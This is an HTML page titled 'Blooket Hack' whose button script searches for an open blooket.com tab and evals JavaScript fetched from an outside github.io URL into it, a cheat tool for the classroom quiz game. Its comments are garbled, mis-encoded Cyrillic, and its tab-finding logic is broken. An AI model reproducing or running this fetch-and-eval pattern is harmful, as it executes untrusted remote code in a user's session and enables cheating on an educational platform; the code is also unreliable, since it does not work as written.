<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blooket Hack</title>
    <script>
        function runHack() {
            let blooketTab = null;

            // –ü–µ—Ä–µ–±–∏—Ä–∞–µ–º –≤—Å–µ –æ—Ç–∫—Ä—ã—Ç—ã–µ –æ–∫–Ω–∞
            const tabs = window.open('', '_self');
            if (tabs) {
                for (let i = 0; i < tabs.length; i++) {
                    if (tabs[i].location.href.includes("blooket.com")) {
                        blooketTab = tabs[i];
                        break;
                    }
                }
            }

            // –ï—Å–ª–∏ –Ω–∞—à–ª–∏ –≤–∫–ª–∞–¥–∫—É Blooket, –≤—ã–ø–æ–ª–Ω—è–µ–º –∫–æ–¥
            if (blooketTab) {
                blooketTab.eval(`
                    fetch('https://vasiliy809.github.io/blooket-hacks/hack.js')
                    .then(response => response.text())
                    .then(eval)
                    .catch(error => alert('‚ùå Hack failed: ' + error));
                `);
            } else {
                alert("‚ùå No open Blooket tab found! Open Blooket first and try again.");
            }
        }
    </script>
</head>
<body>
    <h1>Blooket Hack</h1>
    <button onclick="runHack()">üöÄ Run Hack in Blooket</button>
</body>
</html>
